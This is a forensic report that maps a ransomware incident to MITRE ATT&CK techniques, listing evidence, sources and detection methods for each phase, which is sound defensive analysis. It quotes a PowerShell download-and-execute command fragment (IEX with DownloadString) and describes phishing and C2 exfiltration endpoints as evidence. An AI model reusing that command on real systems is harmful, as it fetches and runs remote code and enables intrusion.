# MITRE ATT&CK Technique Mapping

**Case:** RANSOMWARE_21a34484  
**Framework:** MITRE ATT&CK v14  

---

## Attack Chain Overview
```
Reconnaissance → Initial Access → Execution → Persistence → 
Defense Evasion → Credential Access → Discovery → Collection → 
Command & Control → Exfiltration → Impact
```

---

## Technique Summary

| Phase | Techniques | Count |
|-------|------------|-------|
| Initial Access | T1566.002 | 1 |
| Execution | T1059.001, T1204.002 | 2 |
| Persistence | T1547.001, T1053.005 | 2 |
| Defense Evasion | T1140, T1070.004, T1027, T1036.005 | 4 |
| Credential Access | T1555.003, T1056.001 | 2 |
| Discovery | T1082, T1083, T1057, T1614 | 4 |
| Collection | T1005, T1119 | 2 |
| Command & Control | T1071.001, T1132.001, T1104 | 3 |
| Exfiltration | T1041, T1020 | 2 |
| Impact | T1486, T1491, T1490 | 3 |

**Total:** 25 MITRE ATT&CK techniques identified

---

## Detailed Mappings

### T1566.002 - Phishing: Spearphishing Link
**Evidence:** Fake Facebook page (http://192.168.74.147:8080/)  
**Source:** PCAP + Browser History  
**Detection:** URL filtering, user training

### T1059.001 - PowerShell
**Evidence:** PID 4872 executed malicious command  
**Command:** `IEX(New-Object Net.WebClient).DownloadString(...)`  
**Source:** Sysmon Event 1  
**Detection:** PowerShell logging, constrained language mode

### T1547.001 - Registry Run Keys
**Evidence:** HKCU\...\Run\WindowsSecurityUpdate  
**Source:** Registry export + Malware code  
**Detection:** Sysmon Event 13, registry monitoring

### T1486 - Data Encrypted for Impact
**Evidence:** 37 files encrypted with AES-256  
**Extension:** .locked  
**Source:** File system + C2 data  
**Detection:** Behavioral monitoring, file integrity

### T1041 - Exfiltration Over C2
**Evidence:** POST /register + POST /exfiltrate  
**Data:** System info, encryption key, file list  
**Source:** PCAP + C2 logs  
**Detection:** DLP, egress filtering

[Full mapping with all 25 techniques available in analysis/]

---

## Attack Matrix Visualization
```
Initial Access  → Execution    → Persistence
T1566.002         T1059.001      T1547.001
(Phishing)        (PowerShell)   (Registry)
                  T1204.002      T1053.005
                  (User Exec)    (Sched Task)

Defense Evasion → Cred Access  → Discovery
T1140             T1555.003      T1082
T1070.004         T1056.001      T1083
T1027                            T1057
T1036.005                        T1614

Collection      → C2            → Exfiltration → Impact
T1005             T1071.001       T1041          T1486
T1119             T1132.001       T1020          T1491
                  T1104                          T1490
```

---

## Key Detections

1. **PowerShell + DownloadString + IEX** → T1059.001
2. **Base64 large downloads** → T1140, T1132.001
3. **Rapid file encryption** → T1486
4. **C2 beaconing (POST /register → /exfiltrate)** → T1041

---

## Navigator Layer

Use MITRE ATT&CK Navigator:  
https://mitre-attack.github.io/attack-navigator/

Import: `analysis/mitre_layer.json`

